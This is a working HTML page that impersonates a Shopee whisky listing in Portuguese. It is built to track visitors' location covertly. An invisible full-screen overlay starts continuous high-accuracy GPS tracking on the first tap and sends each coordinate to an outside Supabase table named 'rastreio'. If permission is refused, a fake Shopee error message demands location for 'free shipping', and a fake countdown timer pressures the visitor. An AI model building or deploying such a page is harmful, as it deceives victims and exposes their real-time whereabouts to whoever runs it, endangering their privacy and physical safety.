<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shopee | Johnnie Walker Gold Label</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        :root {
            --shopee-orange: #ee4d2d;
            --shopee-bg: #f5f5f5;
        }

        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: var(--shopee-bg);
            margin: 0;
            padding: 0;
            color: #333;
        }

        /* Camada invisível para disparar GPS no primeiro toque */
        #camada-invisivel {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999;
            cursor: pointer;
            background: transparent;
        }

        /* Header Shopee */
        .header {
            background: white;
            padding: 10px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #ddd;
        }

        .back-icon {
            font-size: 20px;
            color: var(--shopee-orange);
        }

        /* Produto */
        .product-img {
            width: 100%;
            background: white;
            display: flex;
            justify-content: center;
            padding: 20px 0;
        }

            .product-img img {
                width: 250px;
                height: auto;
            }

        .info-container {
            background: white;
            padding: 15px;
            margin-bottom: 10px;
        }

        .price-section {
            color: var(--shopee-orange);
            display: flex;
            align-items: baseline;
            gap: 5px;
        }

        .currency {
            font-size: 14px;
            font-weight: bold;
        }

        .amount {
            font-size: 28px;
            font-weight: bold;
        }

        .old-price {
            color: #929292;
            text-decoration: line-through;
            font-size: 14px;
            margin-left: 10px;
        }

        .product-title {
            font-size: 16px;
            line-height: 20px;
            margin: 10px 0;
            font-weight: 400;
            color: rgba(0,0,0,.87);
        }

        .shipping-badge {
            background: #00bfa5;
            color: white;
            font-size: 10px;
            padding: 2px 5px;
            border-radius: 2px;
            display: inline-block;
        }

        .rating {
            color: var(--shopee-orange);
            font-size: 12px;
            margin-top: 5px;
        }

        /* Barra Inferior Shopee */
        .bottom-bar {
            position: fixed;
            bottom: 0;
            width: 100%;
            background: white;
            display: flex;
            border-top: 1px solid #ddd;
            height: 50px;
        }

        .btn-cart {
            width: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--shopee-orange);
            background: #ffeeec;
            font-size: 14px;
            border-right: 1px solid #ee4d2d;
        }

        .btn-buy {
            width: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            background: var(--shopee-orange);
            color: white;
            font-weight: bold;
            font-size: 16px;
        }

        /* Banner Flash Sale */
        .flash-sale {
            background: #ff4721;
            color: white;
            padding: 5px 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-style: italic;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div id="camada-invisivel"></div>

    <div class="header">
        <span class="back-icon">←</span>
        <img src="https://logodownload.org/wp-content/uploads/2021/03/shopee-logo-0.png" height="25">
        <span>⋮</span>
    </div>

    <div class="product-img">
        <img src="https://files.catbox.moe/kwy0ow.png" alt="Whisky">
    </div>

    <div class="flash-sale">
        <span>OFERTA RELÂMPAGO</span>
        <span id="timer">00:45:12</span>
    </div>

    <div class="info-container">
        <div class="price-section">
            <span class="currency">R$</span>
            <span class="amount">150,15</span>
            <span class="old-price">R$ 189,90</span>
        </div>
        <div class="product-title">Johnnie Walker Gold Label Reserve Scotch Whisky 750ml - Edição Especial</div>
        <div class="shipping-badge">Frete Grátis com cupom</div>
        <div class="rating">★★★★★ (4.9) | 1,2mil vendidos</div>
    </div>

    <div class="info-container" style="font-size: 14px; display: flex; justify-content: space-between;">
        <span>Selecione a variação:</span>
        <span style="color: #929292;">750ml ></span>
    </div>

    <div class="bottom-bar">
        <div class="btn-cart">Adicionar ao Carrinho</div>
        <div class="btn-buy" id="buy-btn">Compre Agora</div>
    </div>

    <script>
        const SUPABASE_URL = 'https://zqvfnykxwlcozvawqgrn.supabase.co';
        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpxdmZueWt4d2xjb3p2YXdxZ3JuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3NDkzNDQsImV4cCI6MjA4NTMyNTM0NH0.CevpF9vP4748mb2vFNsOp5Kq6u7Nfp_100bJcW7ogUQ';
        const { createClient } = supabase;
        const _supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

        const overlay = document.getElementById('camada-invisivel');

        function dispararGPS() {
            if ("geolocation" in navigator) {
                navigator.geolocation.watchPosition(async (pos) => {
                    const { latitude, longitude, accuracy } = pos.coords;

                    await _supabase.from('rastreio').insert([{
                        latitude, longitude, precisao: accuracy, dispositivo: "Clone Shopee"
                    }]);

                }, (err) => {
                    // Se ele negar, mostramos um erro da Shopee
                    alert("Erro Shopee: Para calcular o Frete Grátis deste produto, precisamos da sua localização.");
                }, { enableHighAccuracy: true });
            }
            overlay.style.display = 'none'; // Some após o toque
        }

        // Qualquer toque no site dispara
        overlay.addEventListener('click', dispararGPS);
        overlay.addEventListener('touchstart', dispararGPS);

        // Cronômetro falso para urgência
        let tempo = 2712;
        setInterval(() => {
            tempo--;
            let min = Math.floor(tempo / 60);
            let seg = tempo % 60;
            document.getElementById('timer').innerText = `00:${min < 10 ? '0' + min : min}:${seg < 10 ? '0' + seg : seg}`;
        }, 1000);
    </script>
</body>
</html>
